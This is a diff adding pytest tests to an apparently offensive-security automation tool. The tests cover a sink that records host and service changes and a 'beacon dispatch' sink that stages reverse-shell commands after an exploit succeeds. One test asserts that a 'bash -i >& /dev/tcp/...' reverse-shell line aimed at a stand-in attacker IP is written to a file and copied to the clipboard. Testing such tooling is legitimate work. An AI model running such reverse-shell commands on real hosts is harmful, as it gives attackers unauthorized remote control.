@@ -67,6 +67,7 @@ def test_default_sinks_cover_required_surfaces():
         "intel_graph",
         "attack_graph",
         "report",
+        "world_diff",
     } <= set(DEFAULT_SINKS)
     assert "campaign_db" not in DEFAULT_SINKS
 
@@ -247,6 +248,100 @@ def test_dedupe_key_includes_port_and_requested_sinks(tmp_path: Path):
     assert bus.record(second, sinks=["a"]) == {"a": True}
     assert bus.record(first, sinks=["b"]) == {"b": True}
     assert calls == ["a", "a", "b"]
+
+
+def test_world_diff_sink_records_host_changes(tmp_path: Path):
+    """Given a discovery outcome, When the diff sink runs, Then the change lands and the snapshot is stored."""
+    from modules.sinks.world_diff import apply
+
+    (tmp_path / "world_model.json").write_text(
+        json.dumps({"hosts": {"10.0.0.5": {"ip": "10.0.0.5", "state": "scanned", "services": {}}}}),
+        encoding="utf-8",
+    )
+    event = OutcomeEvent(kind="discovery", target="10.0.0.5", metadata={"sessions_dir": str(tmp_path)})
+    assert apply(event) is True
+    rows = [json.loads(line) for line in (tmp_path / "lazy_changes.jsonl").read_text().splitlines()]
+    assert any(row["kind"] == "host_new" and row["ip"] == "10.0.0.5" for row in rows)
+    stored = json.loads((tmp_path / "lazy_host_snapshots.json").read_text())
+    assert "10.0.0.5" in stored["hosts"]
+
+    repeat = OutcomeEvent(kind="discovery", target="10.0.0.5", metadata={"sessions_dir": str(tmp_path)})
+    assert apply(repeat) is False
+    rows = [json.loads(line) for line in (tmp_path / "lazy_changes.jsonl").read_text().splitlines()]
+    assert sum(1 for row in rows if row["kind"] == "host_new") == 1
+
+
+def test_world_diff_sink_detects_service_change(tmp_path: Path):
+    """Given a host whose service changed, When the diff sink runs, Then service_changed is logged."""
+    from modules.sinks.world_diff import apply
+
+    world = {"hosts": {"10.0.0.5": {"ip": "10.0.0.5", "services": {"22": {"name": "ssh", "product": "OpenSSH", "version": "8.9p1", "state": "open"}}}}}
+    (tmp_path / "world_model.json").write_text(json.dumps(world), encoding="utf-8")
+    first = OutcomeEvent(kind="discovery", target="10.0.0.5", metadata={"sessions_dir": str(tmp_path)})
+    apply(first)
+    world["hosts"]["10.0.0.5"]["services"]["22"]["version"] = "9.3p1"
+    (tmp_path / "world_model.json").write_text(json.dumps(world), encoding="utf-8")
+    second = OutcomeEvent(kind="discovery", target="10.0.0.5", metadata={"sessions_dir": str(tmp_path)})
+    assert apply(second) is True
+    rows = [json.loads(line) for line in (tmp_path / "lazy_changes.jsonl").read_text().splitlines()]
+    assert any(row["kind"] == "service_changed" and row["port"] == 22 for row in rows)
+
+
+def test_world_diff_sink_ignores_hostless_events(tmp_path: Path):
+    """Given an event with no host, When the diff sink runs, Then nothing is written."""
+    from modules.sinks.world_diff import apply
+
+    event = OutcomeEvent(kind="finding", target="", metadata={"sessions_dir": str(tmp_path)})
+    assert apply(event) is False
+    assert not (tmp_path / "lazy_changes.jsonl").exists()
+
+
+def test_beacon_dispatch_sink_stages_foothold_command(tmp_path: Path, monkeypatch):
+    """Given a foothold, When the beacon sink runs, Then a ready revshell command is staged."""
+    import modules.sinks.beacon_dispatch as beacon
+
+    monkeypatch.setattr(beacon, "_load_payload", lambda: {"lhost": "192.0.2.10", "reverse_shell_port": 4545})
+    event = OutcomeEvent(
+        kind="exploit",
+        target="10.0.0.5",
+        shell=True,
+        metadata={"sessions_dir": str(tmp_path)},
+    )
+    assert beacon.apply(event) is True
+    staged = (tmp_path / "beacon_dispatch_10.0.0.5.txt").read_text(encoding="utf-8")
+    assert "bash -i >& /dev/tcp/192.0.2.10/4545 0>&1" in staged
+
+
+def test_beacon_dispatch_sink_ignores_non_foothold(tmp_path: Path, monkeypatch):
+    """Given a non-shell event, When the beacon sink runs, Then nothing is staged."""
+    import modules.sinks.beacon_dispatch as beacon
+
+    monkeypatch.setattr(beacon, "_load_payload", lambda: {"lhost": "192.0.2.10", "reverse_shell_port": 4545})
+    event = OutcomeEvent(kind="finding", target="10.0.0.5", shell=False, metadata={"sessions_dir": str(tmp_path)})
+    assert beacon.apply(event) is False
+    assert not (tmp_path / "beacon_dispatch_10.0.0.5.txt").exists()
+
+
+def test_beacon_dispatch_sink_requires_c2_target(tmp_path: Path, monkeypatch):
+    """Given no lhost configured, When the beacon sink runs, Then it fails closed."""
+    import modules.sinks.beacon_dispatch as beacon
+
+    monkeypatch.setattr(beacon, "_load_payload", lambda: {"lhost": "", "reverse_shell_port": 4545})
+    event = OutcomeEvent(kind="exploit", target="10.0.0.5", shell=True, metadata={"sessions_dir": str(tmp_path)})
+    assert beacon.apply(event) is False
+    assert not list(tmp_path.glob("beacon_dispatch_*"))
+
+
+def test_beacon_dispatch_sink_clips_when_enabled(tmp_path: Path, monkeypatch):
+    """Given loop_auto_beacon enabled, When the sink runs, Then the command is copied."""
+    import modules.sinks.beacon_dispatch as beacon
+
+    copies: list[str] = []
+    monkeypatch.setattr(beacon, "_load_payload", lambda: {"lhost": "192.0.2.10", "reverse_shell_port": 4545, "loop_auto_beacon": True})
+    monkeypatch.setattr(beacon, "_copy_clipboard", lambda text: copies.append(text) or True)
+    event = OutcomeEvent(kind="shell", target="10.0.0.9", shell=True, metadata={"sessions_dir": str(tmp_path)})
+    assert beacon.apply(event) is True
+    assert copies and "/dev/tcp/192.0.2.10/4545" in copies[0]
 
 
 def test_transient_sink_failure_is_retried(tmp_path: Path):
